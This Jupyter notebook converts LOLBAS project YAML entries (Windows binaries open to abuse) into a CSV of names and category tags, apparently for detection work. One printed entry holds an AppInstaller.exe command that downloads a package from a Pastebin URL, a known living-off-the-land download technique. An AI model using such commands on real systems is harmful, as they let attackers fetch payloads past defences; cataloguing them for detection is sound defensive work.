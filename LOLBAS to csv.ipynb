{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "f92e7c28",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "fatal: destination path 'LOLBAS' already exists and is not an empty directory.\n"
     ]
    }
   ],
   "source": [
    "!git clone https://github.com/LOLBAS-Project/LOLBAS.git"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "23107a72",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import sys\n",
    "import yaml\n",
    "from yaml.loader import SafeLoader\n",
    "import pandas as pd\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "d10a79e6",
   "metadata": {},
   "outputs": [],
   "source": [
    "lolbas_list = []\n",
    "for root, subdirs, files in os.walk(\".\\LOLBAS\\yml\"):\n",
    "    for file in files:\n",
    "        with open(f'{root}\\\\{file}') as f:\n",
    "            lolbas_entry = yaml.load(f, Loader=SafeLoader)\n",
    "            lolbas_list.append(lolbas_entry)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "acf64fcb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Name': 'AppInstaller.exe',\n",
       " 'Description': 'Tool used for installation of AppX/MSIX applications on Windows 10',\n",
       " 'Author': 'Wade Hickey',\n",
       " 'Created': datetime.date(2020, 12, 2),\n",
       " 'Commands': [{'Command': 'start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw',\n",
       "   'Description': 'AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\<RANDOM-8-CHAR-DIRECTORY>',\n",
       "   'Usecase': 'Download file from Internet',\n",
       "   'Category': 'Download',\n",
       "   'Privileges': 'User',\n",
       "   'MitreID': 'T1105',\n",
       "   'OperatingSystem': 'Windows 10, Windows 11'}],\n",
       " 'Full_Path': [{'Path': 'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\\\AppInstaller.exe'}],\n",
       " 'Detection': [{'Sigma': 'https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml'}],\n",
       " 'Resources': [{'Link': 'https://twitter.com/notwhickey/status/1333900137232523264'}],\n",
       " 'Acknowledgement': [{'Person': 'Wade Hickey', 'Handle': '@notwhickey'}]}"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lolbas_list[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "458c87f0",
   "metadata": {},
   "outputs": [],
   "source": [
    "def unique(list1):\n",
    " \n",
    "    # insert the list to the set\n",
    "    list_set = set(list1)\n",
    "    # convert the set to the list\n",
    "    unique_list = (list(list_set))\n",
    "    return unique_list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "ba3cab7f",
   "metadata": {},
   "outputs": [],
   "source": [
    "def process_lolbas_entry(entry):\n",
    "    return {\n",
    "        'name': entry['Name'].lower(),\n",
    "        'tags': \",\".join(unique(['lolbas'] + [ 'lolbas_' + x[\"Category\"].lower() for x in entry[\"Commands\"] ]))\n",
    "    }"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "ddeb735c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'name': 'appinstaller.exe', 'tags': 'lolbas,lolbas_download'}"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "list(map(process_lolbas_entry, lolbas_list))[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "c418c6a9",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(r'.\\lolbas_entries.yaml', 'w') as file:\n",
    "    documents = yaml.dump(list(map(process_lolbas_entry, lolbas_list)), file)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "49cf4cf0",
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.DataFrame(list(map(process_lolbas_entry, lolbas_list)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "13fba3f2",
   "metadata": {},
   "outputs": [],
   "source": [
    "df[df['name'].str.contains(\".exe\")].to_csv(\"lolbas_dict.csv\",index=False,header=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
